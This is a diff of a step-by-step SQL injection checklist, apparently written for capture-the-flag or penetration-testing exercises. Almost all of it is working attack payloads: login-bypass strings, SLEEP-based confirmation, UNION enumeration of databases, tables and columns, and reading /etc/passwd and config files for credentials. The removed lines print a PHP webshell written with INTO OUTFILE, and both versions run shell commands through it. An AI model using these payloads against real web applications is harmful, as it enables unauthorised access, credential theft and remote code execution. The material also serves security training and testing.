@@ -1,51 +1,49 @@
 # SQL Injection Checklist
 
-## Discovery
-- [ ] Inject `'` into every input field — `500` = injectable, `302/error message` = runs but fails
-- [ ] Confirm injection with `' OR SLEEP(5)-- -` — 5s delay = confirmed; fast = parameterized
-- [ ] Test ALL input fields including hidden/non-obvious ones (invitation codes, search, profile fields)
-- [ ] Check both GET params and POST body fields
+**Rule:** Simple → Complex. Don't skip steps. Test EVERY field before concluding the app isn't injectable.
 
-## Auth Bypass
-- [ ] Try `admin'-- -` (comment out password check)
-- [ ] Try `admin')-- -` if query uses parentheses
-- [ ] Try `' OR '1'='1` (no comment — uses original closing quote)
-- [ ] Try OR in password field too: `something' OR '1'='1`
-- [ ] For invitation codes / access codes: prefix with valid-format string before injecting
-  - e.g. `xxxx-xxxx-1111' or '1'='1`
-- [ ] Try `' OR id=N)-- -` to log in as specific user
+## Step 1 — Map Input Fields
+- [ ] List ALL input fields: login, registration (every field), search, URL params, hidden fields
+- [ ] Note field names, form action URLs, GET vs POST
 
-## UNION Injection — Column Count
-- [ ] Use `ORDER BY` to count: `' ORDER BY 1-- -`, `' ORDER BY 2-- -` ... until error
-- [ ] Confirm with `' UNION SELECT 1,2,3,4-- -` (use correct column count)
-- [ ] Identify which columns are printed to page (replace numbers with `@@version`)
+## Step 2 — Probe Each Field
+- [ ] Inject `'` into each field → watch for `500` or behavior change
+- [ ] If unsure → confirm with `' OR SLEEP(5)-- -` (5s delay = injectable)
+- [ ] Fast response + no change → parameterized → move to next field
+- [ ] **Don't give up on the app — keep testing other fields**
 
-## UNION Injection — Enumeration
-- [ ] Get current DB: `' UNION SELECT 1,2,database(),4-- -`
-- [ ] List all DBs: query `INFORMATION_SCHEMA.SCHEMATA`
+## Step 3 — Auth Bypass (in order, stop when one works)
+- [ ] `admin'-- -`
+- [ ] `admin')-- -` (if query uses parentheses)
+- [ ] `' OR '1'='1` (no comment — uses original closing quote)
+- [ ] `' OR 1=1-- -`
+- [ ] OR injection in password field: `' OR '1'='1`
+- [ ] For invitation/access codes: prefix with valid-format string → `xxxx-1111' OR '1'='1`
+
+## Step 4 — UNION Injection
+- [ ] Count columns: `' ORDER BY 1-- -`, increment until error
+- [ ] Confirm column count: `' UNION SELECT 1,2,3-- -`
+- [ ] Find visible columns: note which numbers appear in output
+- [ ] Get current DB: `' UNION SELECT 1,database(),3-- -`
 - [ ] List tables: query `INFORMATION_SCHEMA.TABLES WHERE table_schema='dbname'`
 - [ ] List columns: query `INFORMATION_SCHEMA.COLUMNS WHERE table_name='tablename'`
-- [ ] Dump target data: `SELECT col FROM db.table WHERE condition`
+- [ ] Dump target data
 
-## File Read
-- [ ] Confirm user: `user()` or `SELECT user FROM mysql.user`
+## Step 5 — File Read
+- [ ] Confirm user: `user()`
 - [ ] Confirm FILE privilege: query `information_schema.user_privileges`
-- [ ] Check `secure_file_priv`: empty = can read/write anywhere; NULL = blocked
-- [ ] Read `/etc/passwd` to confirm Linux and file read works
-- [ ] Read app config: `config.php`, `db.php`, `conn.php` for DB credentials
-- [ ] Read web server config to find web root:
-  - `/etc/nginx/sites-enabled/default`
-  - `/etc/apache2/apache2.conf`
+- [ ] Check `secure_file_priv`: empty = can read/write; NULL = blocked
+- [ ] Read `/etc/passwd` to confirm file read works
+- [ ] Find web root: read `/etc/nginx/sites-enabled/default` or apache config
+- [ ] Read app config files for credentials: `config.php`, `db.php`
 
-## File Write / RCE
-- [ ] Write webshell: `UNION SELECT "","<?php system($_REQUEST[0]); ?>","","" INTO OUTFILE '/webroot/shell.php'-- -`
-- [ ] Verify shell exists: browse to `/shell.php?0=id`
+## Step 6 — RCE
+- [ ] Write webshell to web root via `INTO OUTFILE`
+- [ ] Confirm execution: `shell.php?0=id`
 - [ ] Find flag: `?0=find / -name "flag_*" 2>/dev/null`
-- [ ] Cat flag: `?0=cat /path/to/flag.txt`
+- [ ] Cat flag
 
-## Key Pitfalls
-- [ ] Login form not injectable? Check OTHER fields — registration codes, search, profile
-- [ ] OR 1=1 gives 500? Table may be empty (OR on empty table = 0 rows) — try UNION instead
-- [ ] OR injection causing 500 on multi-step form? A second query (UPDATE) may re-use the injected input
-- [ ] Valid-format prefix needed? Some fields validate format before SQL — prefix with valid-looking data
-- [ ] Always count columns before UNION — wrong count = 500
+## Pitfall Reminders
+- [ ] OR on empty table = 0 rows → still fails → switch to UNION approach
+- [ ] 500 on OR = second query may re-use input (UPDATE after SELECT) → try no-comment OR pattern
+- [ ] Always use Burp Repeater for precise payload delivery — browser URL-encodes everything
